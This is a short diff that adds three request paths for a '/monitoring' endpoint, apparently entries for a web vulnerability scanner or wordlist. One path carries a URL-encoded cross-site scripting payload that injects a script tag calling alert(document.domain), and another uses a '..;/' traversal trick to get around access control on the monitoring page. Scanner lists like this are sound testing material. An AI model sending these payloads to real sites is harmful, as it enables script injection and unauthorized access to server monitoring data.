@@ -1,0 +1,3 @@
+/monitoring?part=graph&graph=usedMemory%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/monitoring
+/..%3B/monitoring
